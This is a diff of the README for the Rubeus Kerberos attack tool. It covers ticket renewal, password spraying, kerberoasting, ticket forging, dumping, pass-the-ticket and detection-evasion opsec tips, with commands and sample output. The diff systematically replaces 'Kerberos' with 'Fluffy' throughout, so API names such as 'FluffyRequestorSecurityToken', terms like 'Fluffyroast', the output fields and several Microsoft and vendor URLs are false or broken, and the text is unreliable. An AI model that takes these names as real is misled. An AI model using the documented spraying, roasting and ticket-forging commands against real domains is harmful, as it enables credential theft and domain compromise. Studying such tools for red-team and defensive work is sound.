-The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.
+The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting Fluffy credential to the current logon session.
 
 Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.
 
@@ -1087,7 +1087,7 @@ The `/autorenew` flag will take an existing `/ticket:X` .kirbi file/blob, sleep 
 
 ### brute
 
-The **brute** action will perform a Kerberos-based password bruteforcing or password spraying attack. **spray** can also be used as the action name.
+The **brute** action will perform a Fluffy-based password bruteforcing or password spraying attack. **spray** can also be used as the action name.
 
     C:\Rubeus>Rubeus.exe brute /password:Password123!! /noticket
 
@@ -1111,7 +1111,7 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
 
 ### preauthscan
 
-The **preauthscan** action will send AS-REQ's for all usernames passed into the `/users` argument to discover accounts that do not require Kerberos pre-authentication.
+The **preauthscan** action will send AS-REQ's for all usernames passed into the `/users` argument to discover accounts that do not require Fluffy pre-authentication.
 
     C:\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab /dc:192.168.71.220
 
@@ -1124,7 +1124,7 @@ The **preauthscan** action will send AS-REQ's for all usernames passed into the 
 
       v2.2.0
 
-    [*] Action: Scan for accounts not requiring Kerberos Pre-Authentication
+    [*] Action: Scan for accounts not requiring Fluffy Pre-Authentication
 
     [*] cclark: Pre-Auth Required
     [*] jjones: Pre-Auth Not Required
@@ -1237,7 +1237,7 @@ Then the S4U2proxy abuse function (using the ticket from the previous S4U2self p
 
 Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_. 
 
-The `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).
+The `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/fluffy-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).
 
 Let's expand on the previous example, forging access to the filesystem on **primary.testlab.local** by abusing its constrained delegation configuration and the alternate service substitution. Let's package it all into one step as well, performing a TGT request, S4U2self process, S4U2proxy execution, and injection of the final ticket:
 
@@ -1433,7 +1433,7 @@ The `/oldpac` switch can be used to exclude the new *Requestor* and *Attributes*
 
 The `/extendedupndns` switch will include the new extended UpnDns elements. This involved adding _2_ to the Flags, as well as containing the samaccountname and account SID.
 
-The `/rodcNumber:x` parameter was added to perform kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06), 
+The `/rodcNumber:x` parameter was added to perform fluffy [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06), 
 
 Forging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:
 
@@ -1683,7 +1683,7 @@ The `/cname:X` and `/crealm:X` arguments can be used to set different values for
 
 The `/authdata` flag can be used to add some generic Authorization Data sections to the EncTicketPart, by default this will include a *KERB-LOCAL* section and a *KERB-AD-RESTRICTION-ENTRY* section with some default values.
 
-The `/nofullpacsig` flag will **exclude** the new *FullPacChecksum*, [introduced](https://support.microsoft.com/en-gb/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb) to resolve the [CVE-2022-37967](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37967) vulnerability. This signature is included by default in any tickets not secured with the krbtgt key.
+The `/nofullpacsig` flag will **exclude** the new *FullPacChecksum*, [introduced](https://support.microsoft.com/en-gb/topic/kb5020805-how-to-manage-fluffy-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb) to resolve the [CVE-2022-37967](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37967) vulnerability. This signature is included by default in any tickets not secured with the krbtgt key.
 
 Forging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **ccob** using the services *RC4* password hash and signing the KDCChecksum and TicketChecksum with the proper KRBTGT *AES256* key, using LDAP with alternate credentials to get the PAC information:
 
@@ -1973,7 +1973,7 @@ This referral TGT can then be used to request service tickets for services in **
 
 The **diamond** action will forge a diamond TGT by modifying a TGT requested for a user using the given arguments. First a TGT will be requested for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. Alternatively, PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. Lastly, the `/tgtdeleg` flag can be passed to request a TGT using the tgtdeleg trick. The `/krbkey:X` argument is used to decrypt the ticket, resign it after the changes have been made, and rencrypt the ticket.
 
-If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
+If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. The `/ptt` flag will "pass-the-ticket" and apply the resulting Fluffy credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
 
 Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.
 
@@ -2035,8 +2035,8 @@ Creating a diamond TGT using the tgtdeleg trick:
     [*] Action: Diamond Ticket
 
     [*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
-    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/Earth-DC.marvel.local'
-    [+] Kerberos GSS-API initialization success!
+    [*] Initializing Fluffy GSS-API w/ fake delegation for target 'cifs/Earth-DC.marvel.local'
+    [+] Fluffy GSS-API initialization success!
     [+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
     [*] Found the AP-REQ delegation ticket in the GSS-API output.
     [*] Authenticator etype: aes256_cts_hmac_sha1
@@ -2068,7 +2068,7 @@ Breakdown of the ticket management commands:
 | Command     | Description |
 | ----------- | ----------- |
 | [ptt](#ptt) | Apply a ticket to the current (or specified) logon session |
-| [purge](#purge) | Purge the current (or specified) logon session of Kerberos tickets |
+| [purge](#purge) | Purge the current (or specified) logon session of Fluffy tickets |
 | [describe](#describe) | Describe a ticket base64 blob or .kirbi file |
 
 
@@ -2104,7 +2104,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
 
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
         [0] - 0x12 - aes256_cts_hmac_sha1
         Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM
@@ -2128,7 +2128,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
 
 
 
-    [*] Action: List Kerberos Tickets (All Users)
+    [*] Action: List Fluffy Tickets (All Users)
 
     [*] Target LUID     : 0x474722b
 
@@ -2136,7 +2136,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
     Domain                   : TESTLAB
     LogonId                  : 0x474722b
     UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
-    AuthenticationPackage    : Kerberos
+    AuthenticationPackage    : Fluffy
     LogonType                : Interactive
     LogonTime                : 2/11/2019 10:58:53 PM
     LogonServer              : PRIMARY
@@ -2179,7 +2179,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
 
 
 
-    [*] Action: List Kerberos Tickets (All Users)
+    [*] Action: List Fluffy Tickets (All Users)
 
     [*] Target LUID     : 0x474722b
 
@@ -2187,7 +2187,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
     Domain                   : TESTLAB
     LogonId                  : 0x474722b
     UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
-    AuthenticationPackage    : Kerberos
+    AuthenticationPackage    : Fluffy
     LogonType                : Interactive
     LogonTime                : 2/11/2019 10:58:53 PM
     LogonServer              : PRIMARY
@@ -2203,7 +2203,7 @@ The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the cur
 
 ### purge
 
-The **purge** action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:0xA..`.
+The **purge** action will purge all Fluffy tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:0xA..`.
 
     C:\Rubeus>Rubeus.exe klist
 
@@ -2218,7 +2218,7 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
         [0] - 0x12 - aes256_cts_hmac_sha1
         Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
@@ -2268,7 +2268,7 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
 
     C:\Rubeus>
@@ -2289,7 +2289,7 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 
 
-    [*] Action: Triage Kerberos Tickets
+    [*] Action: Triage Fluffy Tickets
 
     [*] Target LUID     : 0x474722b
 
@@ -2330,7 +2330,7 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 
 
-    [*] Action: Triage Kerberos Tickets
+    [*] Action: Triage Fluffy Tickets
 
     [*] Target LUID     : 0x474722b
 
@@ -2344,7 +2344,7 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 The **describe** action takes a `/ticket:X` value (TGT or service ticket), parses it, and describes the values of the ticket. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.
 
-If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.
+If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Fluffyroast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.
 
 The EncTicketPart (encrypted section of the ticket) can be decrypted using the `/servicekey:X` argument, this will also verify the ServerChecksum within the PAC. The `/krbkey:X` argument can also be used for service tickets to verify the KDCChecksum and TicketChecksum (if it exists).
 
@@ -2377,7 +2377,7 @@ Display information about a TGT:
     KeyType               :  rc4_hmac
     Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==
 
-Display information about service ticket with an extracted Kerberoast "hash":
+Display information about service ticket with an extracted Fluffyroast "hash":
 
     C:\Rubeus>Rubeus.exe describe /ticket:service_ticket.kirbi
 
@@ -2403,7 +2403,7 @@ Display information about service ticket with an extracted Kerberoast "hash":
     Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
     KeyType               :  rc4_hmac
     Base64(key)           :  WqGWK4htp7rM1CURpxjMPA==
-    Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...
+    Fluffyroast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...
 
 Display information about a TGT along with the decrypted PAC:
 
@@ -2475,7 +2475,7 @@ Display information about a TGT along with the decrypted PAC:
           Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
           Signature            : 32C03715F0B11E3D2EDA3D05 (VALID)
 
-Displaying information about an AES256 encrypted service ticket with an extracted Kerberoast "hash":
+Displaying information about an AES256 encrypted service ticket with an extracted Fluffyroast "hash":
 
     C:\Rubeus>Rubeus.exe describe /serviceuser:exploitph /ticket:doIFSjCCB...(snip)...Vyb2FzdBsCbWU=
 
@@ -2502,7 +2502,7 @@ Displaying information about an AES256 encrypted service ticket with an extracte
       Flags                    :  name_canonicalize, pre_authent, renewable
       KeyType                  :  aes256_cts_hmac_sha1
       Base64(key)              :  T+hpOdnnvvLhnSwup/O/DmYYY3CXVP4kN/Hq5qWWwKg=
-      Kerberoast Hash       :  $krb5tgs$18$exploitph$RUBEUS.GHOSTPACK.LOCAL$*roast/me*$1063B9C2E8BAB76E5051F5DE
+      Fluffyroast Hash       :  $krb5tgs$18$exploitph$RUBEUS.GHOSTPACK.LOCAL$*roast/me*$1063B9C2E8BAB76E5051F5DE
                                $CD5F3403552BD882CBC52389C9851EFD9B7B72174CCA44876DD4E2958FE807B2A899EE33279835D
                                01BEF12B6FE65174B4BF7B6A5062F45DDBEDA76CF2B122579194B3F1CF3192F982EFE5109B4FF644
                                FDE4D4A170551B764A699DC4DB3535AE937E24D8D5EF0C980C98D115A6707A1F2583FAAB76FD4514
@@ -2548,9 +2548,9 @@ Breakdown of the ticket extraction/harvesting commands:
 
 ### triage
 
-The **triage** action will output a table of the current user's Kerberos tickets, if not elevated. If run from an elevated context, a table describing all Kerberos tickets on the system is displayed. Ticket can be filtered for a specific service with `/service:SNAME`.
+The **triage** action will output a table of the current user's Fluffy tickets, if not elevated. If run from an elevated context, a table describing all Fluffy tickets on the system is displayed. Ticket can be filtered for a specific service with `/service:SNAME`.
 
-If elevated, tickets can be filtered for a specific LogonID with `/luid:0xA..` or a specific user with `/user:USER`. This can be useful when triaging systems with a lot of Kerberos tickets.
+If elevated, tickets can be filtered for a specific LogonID with `/luid:0xA..` or a specific user with `/user:USER`. This can be useful when triaging systems with a lot of Fluffy tickets.
 
 Triage all enumerateable tickets (non-elevated):
 
@@ -2567,7 +2567,7 @@ Triage all enumerateable tickets (non-elevated):
 
 
 
-    [*] Action: Triage Kerberos Tickets (Current User)
+    [*] Action: Triage Fluffy Tickets (Current User)
 
     [*] Current LUID    : 0x4420e
 
@@ -2594,7 +2594,7 @@ Triage all enumerateable tickets (elevated):
 
 
 
-    [*] Action: Triage Kerberos Tickets (All Users)
+    [*] Action: Triage Fluffy Tickets (All Users)
 
     -------------------------------------------------------------------------------------------------------------
     | LUID      | UserName                   | Service                                  | EndTime               |
@@ -2637,7 +2637,7 @@ Triage targeting a specific service (elevated):
 
 
 
-    [*] Action: Triage Kerberos Tickets (All Users)
+    [*] Action: Triage Fluffy Tickets (All Users)
 
     [*] Target service  : ldap
 
@@ -2652,9 +2652,9 @@ Triage targeting a specific service (elevated):
 
 ### klist
 
-The **klist** will list detailed information on the current user's logon session and Kerberos tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Kerberos tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with `/luid:0xA..` (if elevated).
+The **klist** will list detailed information on the current user's logon session and Fluffy tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Fluffy tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with `/luid:0xA..` (if elevated).
 
-Listing the current (non-elevated) user's logon session and Kerberos ticket information:
+Listing the current (non-elevated) user's logon session and Fluffy ticket information:
 
     C:\Rubeus>Rubeus.exe klist
 
@@ -2669,7 +2669,7 @@ Listing the current (non-elevated) user's logon session and Kerberos ticket info
 
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
     [*] Current LUID    : 0x4420e
 
@@ -2682,7 +2682,7 @@ Listing the current (non-elevated) user's logon session and Kerberos ticket info
         ...(snip)...
 
 
-**Elevated** listing of another user's logon session/Kerberos ticket information:
+**Elevated** listing of another user's logon session/Fluffy ticket information:
 
     C:\Rubeus>Rubeus.exe klist /luid:0x47869b4
 
@@ -2697,7 +2697,7 @@ Listing the current (non-elevated) user's logon session and Kerberos ticket info
 
 
 
-    [*] Action: List Kerberos Tickets (All Users)
+    [*] Action: List Fluffy Tickets (All Users)
 
     [*] Target LUID     : 0x47869b4
 
@@ -2705,7 +2705,7 @@ Listing the current (non-elevated) user's logon session and Kerberos ticket info
     Domain                   : TESTLAB
     LogonId                  : 0x47869b4
     UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
-    AuthenticationPackage    : Kerberos
+    AuthenticationPackage    : Fluffy
     LogonType                : Interactive
     LogonTime                : 2/11/2019 11:05:31 PM
     LogonServer              : PRIMARY
@@ -2723,7 +2723,7 @@ Listing the current (non-elevated) user's logon session and Kerberos ticket info
 
 ### dump
 
-The **dump** action will extract current TGTs and service tickets if in an elevated context. If not elevated, service tickets for the current user are extracted. The resulting extracted tickets can be filtered by `/service` (use `/service:krbtgt` for TGTs) and/or logon ID (the `/luid:0xA..` parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.
+The **dump** action will extract current TGTs and service tickets if in an elevated context. If not elevated, service tickets for the current user are extracted. The resulting extracted tickets can be filtered by `/service` (use `/service:krbtgt` for TGTs) and/or logon ID (the `/luid:0xA..` parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **fluffy::ptt** functionality.
 
 **Note:** if run from a _non-elevated_ context, the session keys for TGTs are not returned (by default) from the associated APIs, so only service tickets extracted will be usable. If you want to (somewhat) workaround this, use the **tgtdeleg** command.
 
@@ -2742,7 +2742,7 @@ Extracting the current user's usable service tickets:
 
 
 
-    [*] Action: Dump Kerberos Ticket Data (Current User)
+    [*] Action: Dump Fluffy Ticket Data (Current User)
 
     [*] Current LUID    : 0x4420e
 
@@ -2790,7 +2790,7 @@ Extracting the current user's usable service tickets:
 
 
 
-    [*] Action: Dump Kerberos Ticket Data (All Users)
+    [*] Action: Dump Fluffy Ticket Data (All Users)
 
     [*] Target LUID: 0x47869cc
 
@@ -2867,7 +2867,7 @@ Extracting the current user's usable service tickets:
 
 
 
-    [*] Action: Dump Kerberos Ticket Data (All Users)
+    [*] Action: Dump Fluffy Ticket Data (All Users)
 
     [*] Target service  : krbtgt
 
@@ -2947,7 +2947,7 @@ Extracting the current user's usable service tickets:
 
 ### tgtdeleg
 
-The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.
+The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Fluffy GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Fluffy security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Fluffy cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.
 
 If automatic target/domain extraction is failing, a known SPN of a service configured with unconstrained delegation can be specified with `/target:SPN`.
 
@@ -2966,8 +2966,8 @@ If automatic target/domain extraction is failing, a known SPN of a service confi
     [*] Action: Request Fake Delegation TGT (current user)
 
     [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'
-    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
-    [+] Kerberos GSS-API initialization success!
+    [*] Initializing Fluffy GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
+    [+] Fluffy GSS-API initialization success!
     [+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
     [*] Found the AP-REQ delegation ticket in the GSS-API output.
     [*] Authenticator etype: aes256_cts_hmac_sha1
@@ -3077,23 +3077,23 @@ Breakdown of the roasting commands:
 
 | Command     | Description |
 | ----------- | ----------- |
-| [kerberoast](#kerberoast) | Perform Kerberoasting against all (or specified) users |
+| [fluffyroast](#fluffyroast) | Perform Fluffyroasting against all (or specified) users |
 | [asreproast](#asreproast) | Perform AS-REP roasting against all (or specified) users |
 
 
-### kerberoast
+### fluffyroast
 
-The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket (for default behavior, [opsec table](#kerberoasting-opsec) for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.
+The **fluffyroast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [FluffyRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.fluffyrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket (for default behavior, [opsec table](#fluffyroasting-opsec) for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.
 
-With no other arguments, all user accounts with SPNs set in the current domain are Kerberoasted, _requesting their highest supported encryption type_ (see the [opsec table](#kerberoasting-opsec)). The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
+With no other arguments, all user accounts with SPNs set in the current domain are Fluffyroasted, _requesting their highest supported encryption type_ (see the [opsec table](#fluffyroasting-opsec)). The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
 
-The `/stats` flag will output statistics about kerberoastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.
+The `/stats` flag will output statistics about fluffyroastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.
 
 The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.
 
 If the `/simple` flag is specified, roasted hashes will be output to the console, one per line.
 
-If the `/nowrap` flag is specified, Kerberoast results will not be line-wrapped.
+If the `/nowrap` flag is specified, Fluffyroast results will not be line-wrapped.
 
 If the the TGT `/ticket:X` supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If `/ticket:X` is used with `/spn:Y` or `/spns:Y` (`/spns:` can be a file containing each SPN on a new line or a comma separated list) then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with `/dc:Z`.
 
@@ -3101,11 +3101,11 @@ If the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to 
 
 If the `/aes` flag is supplied, accounts with AES encryption enabled in **msDS-SupportedEncryptionTypes** are enumerated and AES service tickets are requested.
 
-If the `/ldapfilter:X` argument is supplied, the supplied LDAP filter will be added to the final LDAP query used to find Kerberoastable users.
+If the `/ldapfilter:X` argument is supplied, the supplied LDAP filter will be added to the final LDAP query used to find Fluffyroastable users.
 
 If the `/rc4opsec` flag is specified, the **tgtdeleg** trick is used, and accounts **without** AES enabled are enumerated and roasted.
 
-If you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
+If you want to use alternate domain credentials for Fluffyroasting (and searching for users to Fluffyroast), they can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
 
 If the `/pwdsetafter:MM-dd-yyyy` argument is supplied, only accounts whose password was last changed after MM-dd-yyyy will be enumerated and roasted.
 
@@ -3115,7 +3115,7 @@ If the `/resultlimit:NUMBER` argument is specified, the number of accounts that 
 
 If the `/delay:MILLISECONDS` argument is specified, that number of milliseconds is paused between TGS requests. The `/jitter:1-100` flag can be combined for a % jitter.
 
-If the `/enterprise` flag is used, the spn is assumed to be an enterprise principal (i.e. *user@domain.com*). This flag only works when kerberoasting with a TGT.
+If the `/enterprise` flag is used, the spn is assumed to be an enterprise principal (i.e. *user@domain.com*). This flag only works when fluffyroasting with a TGT.
 
 If the `/autoenterprise` flag is used, if roasting an SPN fails (due to an invalid or duplicate SPN) Rubeus will automatically retry using the enterprise principal. This is only useful when `/spn` or `/spns` is *not* supplied as Rubeus needs to know the target accounts samaccountname, which it gets when querying LDAP for the account information.
 
@@ -3124,28 +3124,28 @@ If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
 If the `/nopreauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/nopreauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.
 
 
-#### kerberoasting opsec
+#### fluffyroasting opsec
 
 Here is a table comparing the behavior of various flags from an opsec perspective:
 
 | Arguments     | Description |
 | ----------- | ----------- |
-| **none** | Use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |
+| **none** | Use FluffyRequestorSecurityToken roasting method, roast w/ highest supported encryption |
 | **/tgtdeleg** | Use the **tgtdeleg** trick to perform TGS-REQ requests of RC4-enabled accounts, roast all accounts w/ RC4 specified |
 | **/ticket:X** | Use the supplied TGT blob/file for TGS-REQ requests, roast all accounts w/ RC4 specified |
 | **/rc4opsec** | Use the **tgtdeleg** trick, enumerate accounts _without_ AES enabled, roast w/ RC4 specified |
-| **/aes** | Enumerate accounts with AES enabled, use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |
+| **/aes** | Enumerate accounts with AES enabled, use FluffyRequestorSecurityToken roasting method, roast w/ highest supported encryption |
 | **/aes /tgtdeleg** | Use the **tgtdeleg** trick, enumerate accounts with AES enabled, roast w/ AES specified |
 | **/pwdsetafter:X** | Use the supplied date and only enumerate accounts with password last changed after that date |
 | **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |
 | **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |
-| **/nopreauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |
+| **/nopreauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for fluffyroasting detections |
 
 #### Examples
 
-Kerberoasting all users in the current domain using the default `KerberosRequestorSecurityToken.GetRequest` method:
+Fluffyroasting all users in the current domain using the default `FluffyRequestorSecurityToken.GetRequest` method:
 
-    C:\Rubeus>Rubeus.exe kerberoast
+    C:\Rubeus>Rubeus.exe fluffyroast
 
      ______        _
     (_____ \      | |
@@ -3157,7 +3157,7 @@ Kerberoasting all users in the current domain using the default `KerberosRequest
     v1.3.4
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
 
     [*] SamAccountName         : harmj0y
@@ -3174,9 +3174,9 @@ Kerberoasting all users in the current domain using the default `KerberosRequest
     ...(snip)...
 
 
-Kerberoasting all users in a specific OU, saving the hashes to an output file:
+Fluffyroasting all users in a specific OU, saving the hashes to an output file:
 
